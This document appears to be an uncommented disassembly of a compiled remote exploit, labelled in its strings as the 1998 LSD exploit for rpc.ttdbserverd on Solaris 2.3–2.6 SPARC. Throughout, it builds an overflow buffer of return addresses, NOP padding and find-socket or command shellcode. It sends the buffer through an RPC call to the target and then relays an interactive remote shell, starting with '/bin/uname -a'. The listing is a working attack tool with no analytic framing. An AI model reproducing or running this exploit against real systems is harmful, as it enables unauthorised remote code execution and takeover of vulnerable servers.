xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff8
push eax
push esp
push edx
push loc.gcc2_compiled._2
push sym._init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
cmp dword [obj.completed.3], 0
jne 0x804892c
jmp 0x8048905
mov esi, esi
lea edx, [eax + 4]
mov dword [obj.p.2], edx
mov eax, dword [eax]
call eax
mov eax, dword [obj.p.2]
cmp dword [eax], 0
jne 0x80488f8
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x8048922
push obj.__EH_FRAME_BEGIN__
call sym.imp.__deregister_frame_info
mov dword [obj.completed.3], 1
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
mov eax, sym.imp.__register_frame_info
test eax, eax
je 0x8048953
push obj.object.8
push obj.__EH_FRAME_BEGIN__
call sym.imp.__register_frame_info
leave
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, obj.__CTOR_LIST__
cmp dword [obj.__CTOR_LIST__], 0xffffffff
je 0x80496c0
mov esi, esi
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x80496b4
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
push 0xffffffffffffffff
mov eax, dword [arg_ch]
push eax
mov eax, dword [arg_8h]
push eax
call sym.imp.xdr_string
add esp, 0xc
mov eax, eax
test eax, eax
jne 0x8048980
xor eax, eax
jmp 0x8048988
nop
mov eax, 1
jmp 0x8048988
nop
leave
ret
push ebp
mov ebp, esp
push ebx
call 0x80486cd
pop ebx
add ebx, 0x233b
cmp dword [ebx + 0x7c], 0
je 0x80486e2
call loc.imp.__gmon_start__
mov esi, esi
call sym.frame_dummy
call loc.gcc2_compiled._1
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x7a24
push edi
push esi
push ebx
mov dword [ebp - 0x754c], 1
mov dword [ebp - 0x7550], 0
mov dword [ebp - 0x7554], 0
mov dword [ebp - 0x757c], 0xa
mov dword [ebp - 0x7578], 0
push str.copyright_LAST_STAGE_OF_DELIRIUM_jul_1998_poland____lsd_pl.net__n
call sym.imp.printf
add esp, 4
push str.rpc.ttdbserverd_for_solaris_2.3_2.4_2.5_2.5.1_2.6_sparc_n_n
call sym.imp.printf
add esp, 4
cmp dword [argv], 1
jg 0x8048a14
mov eax, dword [envp]
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
mov edx, dword [ecx]
push edx
push str.usage:__s_address___s_c_command____p_port____v_6__n
call sym.imp.printf
add esp, 8
push 0xffffffffffffffff
call sym.imp.exit
add esp, 4
nop
nop
lea esi, [esi]
push str.sc:p:v:
mov esi, dword [envp]
add esi, 4
mov dword [ebp - 0x7a18], esi
mov edi, dword [ebp - 0x7a18]
push edi
mov eax, dword [argv]
dec eax
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
push ecx
call sym.imp.getopt
add esp, 0xc
mov dword [ebp - 0x7a18], eax
mov esi, dword [ebp - 0x7a18]
mov dword [ebp - 0x7544], esi
cmp dword [ebp - 0x7544], 0xffffffff
jne 0x8048a6c
jmp 0x8048b48
lea esi, [esi]
mov edi, dword [ebp - 0x7544]
mov dword [ebp - 0x7a18], edi
cmp dword [ebp - 0x7a18], 0x70
je 0x8048ae4
cmp dword [ebp - 0x7a18], 0x70
jg 0x8048a98
cmp dword [ebp - 0x7a18], 0x63
je 0x8048ac0
jmp 0x8048b41
cmp dword [ebp - 0x7a18], 0x73
je 0x8048ab0
cmp dword [ebp - 0x7a18], 0x76
je 0x8048b14
jmp 0x8048b41
nop
mov dword [ebp - 0x754c], 1
jmp 0x8048b41
nop
mov dword [ebp - 0x754c], 0
mov eax, dword [obj.optarg]
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
mov dword [ebp - 0x753c], ecx
jmp 0x8048b41
nop
mov esi, dword [obj.optarg]
mov dword [ebp - 0x7a18], esi
mov edi, dword [ebp - 0x7a18]
push edi
call sym.imp.atoi
add esp, 4
mov dword [ebp - 0x7a18], eax
mov eax, dword [ebp - 0x7a18]
mov dword [ebp - 0x7554], eax
jmp 0x8048b41
nop
mov ecx, dword [obj.optarg]
mov dword [ebp - 0x7a18], ecx
mov esi, dword [ebp - 0x7a18]
push esi
call sym.imp.atoi
add esp, 4
mov dword [ebp - 0x7a18], eax
mov edi, dword [ebp - 0x7a18]
mov dword [ebp - 0x7550], edi
jmp 0x8048a18
mov esi, esi
cmp dword [ebp - 0x7550], 6
jne 0x8048b88
push 0xeffffaf8
call sym.imp.htonl
add esp, 4
mov dword [ebp - 0x7a18], eax
mov eax, dword [ebp - 0x7a18]
mov dword [ebp - 0x7534], eax
mov dword [obj.adrnum], 0x4b0
mov dword [obj.nopnum], 0x514
jmp 0x8048bbb
mov esi, esi
push 0xeffff058
call sym.imp.htonl
add esp, 4
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
mov dword [ebp - 0x7534], ecx
mov dword [obj.adrnum], 0xbb8
mov dword [obj.nopnum], 0x1770
mov esi, dword [ebp - 0x757c]
mov dword [ebp - 0x7a18], esi
mov edi, dword [ebp - 0x7a18]
push edi
mov eax, dword [ebp - 0x7534]
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
push ecx
call sym.imp.ntohl
add esp, 4
mov dword [ebp - 0x7a18], eax
mov esi, dword [ebp - 0x7a18]
push esi
push str.adr0x_08x_timeout_d_
call sym.imp.printf
add esp, 0xc
mov edi, dword [obj.stdout]
mov dword [ebp - 0x7a18], edi
mov eax, dword [ebp - 0x7a18]
push eax
call sym.imp.fflush
add esp, 4
mov word [ebp - 0x7574], 2
movzx ecx, word [ebp - 0x7554]
mov dword [ebp - 0x7a18], ecx
mov esi, dword [ebp - 0x7a18]
push esi
call sym.imp.htons
add esp, 4
mov word [ebp - 0x7a18], ax
mov edi, dword [ebp - 0x7a18]
mov word [ebp - 0x7572], di
mov eax, dword [envp]
add eax, 4
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
mov edx, dword [ecx]
push edx
call sym.imp.inet_addr
add esp, 4
mov dword [ebp - 0x7a18], eax
mov edx, dword [ebp - 0x7a18]
mov dword [ebp - 0x7570], edx
cmp edx, 0xffffffff
jne 0x8048d3c
mov esi, dword [envp]
add esi, 4
mov dword [ebp - 0x7a18], esi
mov edi, dword [ebp - 0x7a18]
mov edx, dword [edi]
push edx
call sym.imp.gethostbyname
add esp, 4
mov dword [ebp - 0x7a18], eax
mov eax, dword [ebp - 0x7a18]
mov dword [ebp - 0x7564], eax
cmp dword [ebp - 0x7564], 0
jne 0x8048cf8
call sym.imp.__errno_location
mov dword [ebp - 0x7a18], eax
mov edx, dword [ebp - 0x7a18]
mov dword [edx], 0x63
push str.error
call sym.imp.perror
add esp, 4
push 0xffffffffffffffff
call sym.imp.exit
add esp, 4
lea esi, [esi]
push 4
mov ecx, dword [ebp - 0x7564]
mov dword [ebp - 0x7a18], ecx
mov esi, dword [ebp - 0x7a18]
mov edx, dword [esi + 0x10]
mov edi, dword [edx]
mov dword [ebp - 0x7a18], edi
mov eax, dword [ebp - 0x7a18]
push eax
lea ecx, [ebp - 0x7574]
mov dword [ebp - 0x7a18], ecx
mov edx, dword [ebp - 0x7a18]
add edx, 4
push edx
call sym.imp.memcpy
add esp, 0xc
mov dword [ebp - 0x7558], 0xffffffff
push 0
push 0
lea esi, [ebp - 0x7558]
mov dword [ebp - 0x7a18], esi
mov edi, dword [ebp - 0x7a18]
push edi
push 1
push 0x186f3
lea eax, [ebp - 0x7574]
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
push ecx
call sym.imp.clnttcp_create
add esp, 0x18
mov dword [ebp - 0x7a18], eax
mov esi, dword [ebp - 0x7a18]
mov dword [ebp - 0x755c], esi
cmp dword [ebp - 0x755c], 0
jne 0x8048db4
push str.error
call sym.imp.clnt_pcreateerror
add esp, 4
push 0xffffffffffffffff
call sym.imp.exit
add esp, 4
lea esi, [esi]
push 0
push 0
push 0
push 0
push str.localhost
call sym.imp.authunix_create
add esp, 0x14
mov dword [ebp - 0x7a18], eax
mov edx, dword [ebp - 0x755c]
mov edi, dword [ebp - 0x7a18]
mov dword [edx], edi
lea eax, [ebp - 0x7530]
mov dword [ebp - 0x7538], eax
mov dword [ebp - 0x7540], 0
nop
mov ecx, dword [ebp - 0x7540]
mov dword [ebp - 0x7a18], ecx
mov esi, dword [ebp - 0x7a18]
cmp esi, dword [obj.adrnum]
jl 0x8048e10
jmp 0x8048e84
mov edi, dword [ebp - 0x7538]
mov dword [ebp - 0x7a18], edi
mov edx, dword [ebp - 0x7540]
mov dword [ebp - 0x7a1c], edx
inc dword [ebp - 0x7538]
cmp dword [ebp - 0x7a1c], 0
jge 0x8048e3e
add dword [ebp - 0x7a1c], 3
mov eax, dword [ebp - 0x7a1c]
sar eax, 2
mov dword [ebp - 0x7a1c], eax
mov ecx, dword [ebp - 0x7a1c]
lea ebx, [ecx*4]
sub edx, ebx
lea esi, [ebp - 0x7534]
mov dword [ebp - 0x7a1c], esi
mov edi, dword [ebp - 0x7a1c]
mov dl, byte [edx + edi]
mov eax, dword [ebp - 0x7a18]
mov byte [eax], dl
inc dword [ebp - 0x7540]
jmp 0x8048df4
nop
mov dword [ebp - 0x7540], 0
nop
mov ecx, dword [ebp - 0x7540]
mov dword [ebp - 0x7a18], ecx
mov esi, dword [ebp - 0x7a18]
cmp esi, dword [obj.nopnum]
jl 0x8048eac
jmp 0x8048f20
mov edi, dword [ebp - 0x7538]
mov dword [ebp - 0x7a18], edi
mov edx, dword [ebp - 0x7540]
mov dword [ebp - 0x7a1c], edx
inc dword [ebp - 0x7538]
cmp dword [ebp - 0x7a1c], 0
jge 0x8048eda
add dword [ebp - 0x7a1c], 3
mov eax, dword [ebp - 0x7a1c]
sar eax, 2
mov dword [ebp - 0x7a1c], eax
mov ecx, dword [ebp - 0x7a1c]
lea ebx, [ecx*4]
sub edx, ebx
mov dword [ebp - 0x7a1c], 0x804a9ed
mov esi, dword [ebp - 0x7a1c]
mov dl, byte [edx + esi]
mov edi, dword [ebp - 0x7a18]
mov byte [edi], dl
inc dword [ebp - 0x7540]
jmp 0x8048e90
mov esi, esi
cmp dword [ebp - 0x754c], 0
je 0x80491b8
mov dword [ebp - 0x7540], 0x10
lea eax, [ebp - 0x7540]
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
push ecx
lea edx, [ebp - 0x7574]
mov dword [ebp - 0x7a18], edx
mov esi, dword [ebp - 0x7a18]
push esi
mov edi, dword [ebp - 0x7558]
mov dword [ebp - 0x7a18], edi
mov eax, dword [ebp - 0x7a18]
push eax
call sym.imp.getsockname
add esp, 0xc
mov dword [ebp - 0x7a18], eax
cmp dword [ebp - 0x7a18], 0xffffffff
jne 0x8048fff
push str.sockmod
push 0x5302
mov ecx, dword [ebp - 0x7558]
mov dword [ebp - 0x7a18], ecx
mov esi, dword [ebp - 0x7a18]
push esi
call sym.imp.ioctl
add esp, 0xc
mov dword [ebp - 0x758c], 0xffff
mov dword [ebp - 0x7588], 0x10
lea edi, [ebp - 0x7574]
mov dword [ebp - 0x7584], edi
lea eax, [ebp - 0x758c]
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
push ecx
push 0x5490
mov esi, dword [ebp - 0x7558]
mov dword [ebp - 0x7a18], esi
mov edi, dword [ebp - 0x7a18]
push edi
call sym.imp.ioctl
add esp, 0xc
movzx eax, word [ebp - 0x7572]
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
push ecx
call sym.imp.ntohs
add esp, 4
mov word [ebp - 0x7a18], ax
movzx edx, word [ebp - 0x7a18]
mov esi, edx
neg esi
mov dword [ebp - 0x7548], esi
mov edi, dword [ebp - 0x7548]
neg edi
mov dword [ebp - 0x7a18], edi
mov eax, dword [ebp - 0x7a18]
push eax
push str.port_d_connected__
call sym.imp.printf
add esp, 8
mov ecx, dword [obj.stdout]
mov dword [ebp - 0x7a18], ecx
mov esi, dword [ebp - 0x7a18]
push esi
call sym.imp.fflush
add esp, 4
mov edi, dword [ebp - 0x7548]
sar edi, 0xa
mov dword [ebp - 0x7a18], edi
mov edx, dword [ebp - 0x7a18]
and edx, 0x3fffff
push edx
call sym.imp.htonl
add esp, 4
mov dword [ebp - 0x7a18], eax
mov eax, dword [ebp - 0x7a18]
or dword [0x804a8d8], eax
mov ecx, dword [ebp - 0x7548]
and ecx, 0x3ff
mov dword [ebp - 0x7a18], ecx
mov esi, dword [ebp - 0x7a18]
push esi
call sym.imp.htonl
add esp, 4
mov dword [ebp - 0x7a18], eax
mov edi, dword [ebp - 0x7a18]
or dword [0x804a8dc], edi
mov dword [ebp - 0x7540], 0
nop
push obj.findsckcode
call sym.imp.strlen
add esp, 4
mov dword [ebp - 0x7a18], eax
mov eax, dword [ebp - 0x7a18]
cmp dword [ebp - 0x7540], eax
jb 0x8049108
jmp 0x8049144
nop
mov ecx, dword [ebp - 0x7538]
mov dword [ebp - 0x7a18], ecx
mov edx, obj.findsckcode
mov esi, dword [ebp - 0x7540]
mov dword [ebp - 0x7a1c], esi
mov edi, dword [ebp - 0x7a1c]
mov dl, byte [edi + edx]
mov eax, dword [ebp - 0x7a18]
mov byte [eax], dl
inc dword [ebp - 0x7538]
inc dword [ebp - 0x7540]
jmp 0x80490e4
nop
mov dword [ebp - 0x7540], 0
nop
push obj.shellcode
call sym.imp.strlen
add esp, 4
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
cmp dword [ebp - 0x7540], ecx
jb 0x8049174
jmp 0x80491b0
nop
mov esi, dword [ebp - 0x7538]
mov dword [ebp - 0x7a18], esi
mov edx, obj.shellcode
mov edi, dword [ebp - 0x7540]
mov dword [ebp - 0x7a1c], edi
mov eax, dword [ebp - 0x7a1c]
mov dl, byte [eax + edx]
mov ecx, dword [ebp - 0x7a18]
mov byte [ecx], dl
inc dword [ebp - 0x7538]
inc dword [ebp - 0x7540]
jmp 0x8049150
jmp 0x80492c7
lea esi, [esi]
mov dword [ebp - 0x7540], 0
mov esi, esi
push obj.cmdshellcode
call sym.imp.strlen
add esp, 4
mov dword [ebp - 0x7a18], eax
mov esi, dword [ebp - 0x7a18]
cmp dword [ebp - 0x7540], esi
jb 0x80491e8
jmp 0x8049224
nop
mov edi, dword [ebp - 0x7538]
mov dword [ebp - 0x7a18], edi
mov edx, obj.cmdshellcode
mov eax, dword [ebp - 0x7540]
mov dword [ebp - 0x7a1c], eax
mov ecx, dword [ebp - 0x7a1c]
mov dl, byte [ecx + edx]
mov esi, dword [ebp - 0x7a18]
mov byte [esi], dl
inc dword [ebp - 0x7538]
inc dword [ebp - 0x7540]
jmp 0x80491c4
nop
mov dword [ebp - 0x7540], 0
nop
mov edi, dword [ebp - 0x753c]
mov dword [ebp - 0x7a18], edi
mov eax, dword [ebp - 0x7a18]
push eax
call sym.imp.strlen
add esp, 4
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
cmp dword [ebp - 0x7540], ecx
jb 0x8049264
jmp 0x80492ac
lea esi, [esi]
mov esi, dword [ebp - 0x7538]
mov dword [ebp - 0x7a18], esi
mov edx, dword [ebp - 0x753c]
mov edi, dword [ebp - 0x7540]
mov dword [ebp - 0x7a1c], edi
add edx, dword [ebp - 0x7a1c]
mov al, byte [edx]
mov byte [ebp - 0x7a1c], al
mov cl, byte [ebp - 0x7a1c]
mov esi, dword [ebp - 0x7a18]
mov byte [esi], cl
inc dword [ebp - 0x7538]
inc dword [ebp - 0x7540]
jmp 0x8049230
mov edi, dword [ebp - 0x7538]
mov dword [ebp - 0x7a18], edi
mov eax, dword [ebp - 0x7a18]
mov byte [eax], 0x3b
inc dword [ebp - 0x7538]
mov ecx, dword [ebp - 0x7538]
mov dword [ebp - 0x7a18], ecx
mov esi, dword [ebp - 0x7a18]
mov byte [esi], 0x3a
inc dword [ebp - 0x7538]
mov edi, dword [ebp - 0x7538]
mov dword [ebp - 0x7a18], edi
mov eax, dword [ebp - 0x7a18]
mov byte [eax], 0
lea ecx, [ebp - 0x7530]
mov dword [ebp - 0x7580], ecx
mov edx, dword [ebp - 0x755c]
mov esi, dword [edx + 4]
mov dword [ebp - 0x7a18], esi
mov esi, dword [ebp - 0x757c]
mov edi, dword [ebp - 0x7578]
mov dword [ebp - 0x7a24], esi
mov dword [ebp - 0x7a20], edi
mov esi, dword [ebp - 0x7a24]
mov edi, dword [ebp - 0x7a20]
push edi
push esi
push 0
push sym.imp.xdr_void
lea edx, [ebp - 0x7580]
push edx
push loc.gcc2_compiled._3
push 7
mov edx, dword [ebp - 0x755c]
push edx
mov edi, dword [ebp - 0x7a18]
mov ebx, dword [edi]
call ebx
add esp, 0x20
mov dword [ebp - 0x7a18], eax
mov eax, dword [ebp - 0x7a18]
mov dword [ebp - 0x7560], eax
cmp dword [ebp - 0x7560], 0
jne 0x8049394
push str._nerror:_not_vulnerable_n
call sym.imp.printf
add esp, 4
push 0xffffffffffffffff
call sym.imp.exit
add esp, 4
nop
push str.sent__n
call sym.imp.printf
add esp, 4
cmp dword [ebp - 0x754c], 0
jne 0x80493b4
push 0
call sym.imp.exit
add esp, 4
push 0xe
push str._bin_uname__a_n
mov ecx, dword [ebp - 0x7558]
mov dword [ebp - 0x7a18], ecx
mov esi, dword [ebp - 0x7a18]
push esi
call sym.imp.write
add esp, 0xc
mov esi, esi
jmp 0x80493e0
jmp 0x8049694
nop
lea edi, [ebp - 0x760c]
mov dword [ebp - 0x7a18], edi
mov ecx, 0x20
mov edi, dword [ebp - 0x7a18]
xor eax, eax
cld
rep stosd dword es:[edi], eax
mov dword [ebp - 0x7610], ecx
mov dword [ebp - 0x7614], edi
jmp 0x8049410
mov esi, esi
jmp 0x80493e0
mov esi, esi
xor eax, eax
bts dword [ebp - 0x760c], eax
mov ecx, dword [ebp - 0x7558]
mov dword [ebp - 0x7a18], ecx
mov edx, dword [ebp - 0x7a18]
shr edx, 5
lea esi, [edx*4]
mov dword [ebp - 0x7a18], esi
lea edx, [ebp - 0x760c]
mov edi, dword [ebp - 0x7558]
mov dword [ebp - 0x7a24], edi
mov ebx, dword [ebp - 0x7a24]
and ebx, 0x1f
mov eax, dword [ebp - 0x7a18]
bts dword [eax + edx], ebx
push 0
push 0
push 0
lea ecx, [ebp - 0x760c]
mov dword [ebp - 0x7a18], ecx
mov esi, dword [ebp - 0x7a18]
push esi
push 0x400
call sym.imp.select
add esp, 0x14
mov dword [ebp - 0x7a18], eax
cmp dword [ebp - 0x7a18], 0
je 0x804968c
xor eax, eax
bt dword [ebp - 0x760c], eax
setb al
mov byte [ebp - 0x7a18], al
cmp byte [ebp - 0x7a18], 0
je 0x8049575
push 0x400
lea ecx, [ebp - 0x7a14]
mov dword [ebp - 0x7a18], ecx
mov esi, dword [ebp - 0x7a18]
push esi
push 0
call sym.imp.read
add esp, 0xc
mov dword [ebp - 0x7a18], eax
mov edi, dword [ebp - 0x7a18]
mov dword [ebp - 0x7614], edi
cmp dword [ebp - 0x7614], 0
jg 0x8049534
call sym.imp.__errno_location
mov dword [ebp - 0x7a18], eax
mov edx, dword [ebp - 0x7a18]
cmp dword [edx], 0xb
je 0x8049524
call sym.imp.__errno_location
mov dword [ebp - 0x7a18], eax
mov edx, dword [ebp - 0x7a18]
cmp dword [edx], 0xb
je 0x8049524
jmp 0x804952c
nop
jmp 0x80493d8
jmp 0x8049534
nop
jmp 0x8049694
lea esi, [esi]
mov eax, dword [ebp - 0x7614]
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
push ecx
lea esi, [ebp - 0x7a14]
mov dword [ebp - 0x7a18], esi
mov edi, dword [ebp - 0x7a18]
push edi
mov eax, dword [ebp - 0x7558]
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
push ecx
call sym.imp.write
add esp, 0xc
mov esi, dword [ebp - 0x7558]
mov dword [ebp - 0x7a24], esi
mov edx, dword [ebp - 0x7a24]
and edx, 0x1f
mov ebx, dword [ebp - 0x7558]
mov edi, ebx
shr edi, 5
mov dword [ebp - 0x7a24], edi
mov eax, dword [ebp - 0x7a24]
lea ebx, [eax*4]
lea ecx, [ebp - 0x760c]
mov dword [ebp - 0x7a24], ecx
mov eax, dword [ebp - 0x7a24]
bt dword [ebx + eax], edx
setb al
mov byte [ebp - 0x7a18], al
cmp byte [ebp - 0x7a18], 0
je 0x804968c
push 0x400
lea ecx, [ebp - 0x7a14]
mov dword [ebp - 0x7a18], ecx
mov esi, dword [ebp - 0x7a18]
push esi
mov edi, dword [ebp - 0x7558]
mov dword [ebp - 0x7a18], edi
mov eax, dword [ebp - 0x7a18]
push eax
call sym.imp.read
add esp, 0xc
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
mov dword [ebp - 0x7614], ecx
cmp dword [ebp - 0x7614], 0
jg 0x804965c
call sym.imp.__errno_location
mov dword [ebp - 0x7a18], eax
mov edx, dword [ebp - 0x7a18]
cmp dword [edx], 0xb
je 0x8049650
call sym.imp.__errno_location
mov dword [ebp - 0x7a18], eax
mov edx, dword [ebp - 0x7a18]
cmp dword [edx], 0xb
je 0x8049650
jmp 0x8049658
jmp 0x80493d8
jmp 0x804965c
nop
jmp 0x8049694
mov esi, esi
mov esi, dword [ebp - 0x7614]
mov dword [ebp - 0x7a18], esi
mov edi, dword [ebp - 0x7a18]
push edi
lea eax, [ebp - 0x7a14]
mov dword [ebp - 0x7a18], eax
mov ecx, dword [ebp - 0x7a18]
push ecx
push 1
call sym.imp.write
add esp, 0xc
jmp 0x80493d8
lea esi, [esi]
lea esp, [ebp - 0x7a30]
pop ebx
pop esi
pop edi
leave
ret
jmp dword [reloc.printf]
jmp dword [reloc.exit]
jmp dword [reloc.getopt]
jmp dword [reloc.atoi]
jmp dword [reloc.htonl]
jmp dword [reloc.ntohl]
jmp dword [reloc.fflush]
jmp dword [reloc.htons]
jmp dword [reloc.inet_addr]
jmp dword [reloc.gethostbyname]
jmp dword [reloc.__errno_location]
jmp dword [reloc.perror]
jmp dword [reloc.memcpy]
jmp dword [reloc.clnttcp_create]
jmp dword [reloc.clnt_pcreateerror]
jmp dword [reloc.authunix_create]
jmp dword [reloc.getsockname]
jmp dword [reloc.ioctl]
jmp dword [reloc.ntohs]
jmp dword [reloc.strlen]
jmp dword [reloc.write]
jmp dword [reloc.select]
jmp dword [reloc.read]
push ebp
mov ebp, esp
push ebx
call 0x80496d9
pop ebx
add ebx, 0x132f
call loc.gcc2_compiled.
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.xdr_void]
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.xdr_string]
